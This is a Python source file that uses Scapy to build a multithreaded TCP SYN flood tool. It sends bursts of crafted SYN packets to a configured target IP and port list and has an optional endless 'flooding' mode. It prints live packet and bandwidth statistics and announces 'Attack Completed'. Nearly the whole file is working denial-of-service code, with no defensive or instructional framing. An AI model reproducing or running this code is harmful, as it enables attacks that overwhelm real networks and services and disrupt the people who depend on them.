#!/usr/bin/env python
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import threading
from scapy.layers.inet import IP, TCP, RandShort, ls, send, math
from scapy.sendrecv import srloop

import time

from CFGClass import *
from amplificationStav import Calc

ATTACK = (
    '     Sent      '
    '|    Traffic    '
    '|    Packet/s   '
    '|     Bit/s     '
    '\n{}').format('-' * 63)

npackets = 0
nbytes = 0
totalPacketNumber = 0
packet4EachThread = 0
floodingFlag = 'no'

class PacketSenderManager:
    def __init__(self, configFileManager, transportType,event):
        self.configFileHelper = configFileManager
        self.transportType = transportType
        self.threads = self.configFileHelper.synFlood.threads
        self.event = event

    def stress(self):
        global totalPacketNumber
        global packet4EachThread
        global floodingFlag
        packet4EachThread = int(math.ceil(self.configFileHelper.synFlood.packetCount / self.threads))
        totalPacketNumber = packet4EachThread*self.threads
        floodingFlag = self.configFileHelper.synFlood.flooding
        if self.transportType =='TCP':
            for i in range(self.threads):
                t = threading.Thread(target=self.startTCPSender)
                t.start()


    def startTCPSender(self):
        global npackets
        global nbytes
        ports = (self.configFileHelper.synFlood.port)
        portList = ports.split(',')
        intPortList = map(int, portList)
        # print ports
        # print portList
        # print intPortList
        ip = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255)
        tcp = TCP(sport=RandShort(),dport=intPortList,seq=0, ack=0,window=64,flags="S")
        data = "SzRaLK"
        package = ip / tcp / data
        if self.configFileHelper.synFlood.flooding == 'yes':
            while self.event.isSet():
                send(package, verbose=False,count=1000)
                npackets += 1
                nbytes = npackets*len(package)
        elif self.configFileHelper.synFlood.flooding == 'no':
            #print 'Packet number' + str(int(packetNumber))
            for i in range(int(packet4EachThread)):
                if self.event.isSet():
                    send(package, verbose=False, count = 100)
                    npackets += 1
                    nbytes = npackets * len(package)
                else:
                    break
            #print str(self.npackets) + ' ' + str(self.nbytes)

        # p = IP(dst=self.configFileHelper.synFlood.targetIp, id=1111, ttl=255) / TCP(sport=RandShort(),
        #                                                                        dport=intPortList,
        #                                                                        seq=12345, ack=1000,
        #                                                                        window=1000,
        #                                                                        flags="S") / "SZR_TPRK"

        # ls(p)
        # if self.configFileHelper.synFlood.flooding == 'yes':
        #     print "Sending Packets in 0.3 second intervals for timeout of 4 sec"
        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2)
        #     # print "Summary of answered & unanswered packets"
        #     # ans.summary()
        #     # unans.summary()
        #     print "source port flags in response"
        #     # for s,r in ans:
        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
        #     ans.make_table(
        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
        # elif self.configFileHelper.synFlood.flooding == 'no':
        #     print 'Flooding mode disabled.'
        #     print str(self.fconfigFileHelper.synFlood.packetCount) + ' packets will be sent..'
        #     ans, unans = srloop(p, inter=0.1, retry=1, timeout=2,
        #                         count=self.configFileHelper.synFlood.packetCount)
        #     # print "Summary of answered & unanswered packets"
        #     # ans.summary()
        #     # unans.summary()
        #     print "source port flags in response"
        #     # for s,r in ans:
        #     # print r.sprintf("%TCP.sport% \t %TCP.flags%")
        #     ans.make_table(
        #         lambda (s, r): (s.dst, s.dport, r.sprintf("%IP.id% \t %IP.ttl% \t %TCP.flags%")))
def monitorNetwork():
    print ATTACK
    FMT = '{:^15}|{:^15}|{:^15}|{:^15}'
    start = time.time()
    while True:
        try:
            current = time.time() - start
            bps = (nbytes * 8) / current
            pps = npackets / current
            out = FMT.format(Calc(npackets, 1000),
                              Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
            sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
            time.sleep(0.5)

            if floodingFlag == 'no':
                if npackets >= totalPacketNumber:
                    printAttackStatistics(start,FMT)
                    print ''
                    break
        except KeyboardInterrupt:
            print '\nInterrupted in monitoring'
            printAttackStatistics(start, FMT)
            print ''
            break
        except Exception as err:
            print '\nError:', str(err)
            printAttackStatistics(start, FMT)
            print ''
            break

def printAttackStatistics(start,FMT):
    if npackets >= totalPacketNumber:
        print ''
        print '\nAttack Completed...'
        print 'Precise Statistics Given Below...'
        print ''
        print ATTACK
        average = time.time() - start
        bps = (nbytes * 8) / average
        pps = npackets / average
        out = FMT.format(Calc(npackets, 1000),
                         Calc(nbytes, 1024, 'B'), Calc(pps, 1000, 'pps'), Calc(bps, 1000, 'bps'))
        sys.stderr.write('\r{}{}'.format(out, ' ' * (60 - len(out))))
        print '\n'